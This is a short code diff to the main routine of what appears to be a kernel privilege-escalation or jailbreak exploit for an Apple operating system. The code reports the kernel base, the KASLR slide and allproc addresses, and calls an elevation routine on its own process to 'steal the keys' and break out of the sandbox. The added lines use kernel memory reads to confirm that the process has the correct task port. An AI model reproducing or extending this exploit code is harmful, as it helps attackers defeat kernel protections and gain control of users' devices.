@@ -48,11 +48,16 @@ int main()
 
     printf("\n[*] Base at: 0x%llx, kaslr slide: 0x%llx, kern struct: 0x%llx", toolbox->base, toolbox->slide,
            find_proc(toolbox, 0));
-    printf("\n[*] Allproc: %llx, task_port: %llx", toolbox->allproc, toolbox->offsets->mytask);
+    printf("\n[*] Allproc: %llx, task_port: %llx", toolbox->allproc, toolbox->offsets->my_task_port);
 
     printf("\n[*] Stealing the keys and breaking myself out - ");
     if (safe_elevate(toolbox, getpid()) || test_rw())
         return 1;
+
+    printf((read_pointer(toolbox, read_pointer(toolbox, toolbox->offsets->my_task_port + __ip_kobject_offset) +
+                                      __bsd_info) == toolbox->offsets->my_proc)
+               ? "Yo! It worked!"
+               : "Huh? You got the wrong task_port my friend");
 
     return 0;
 }
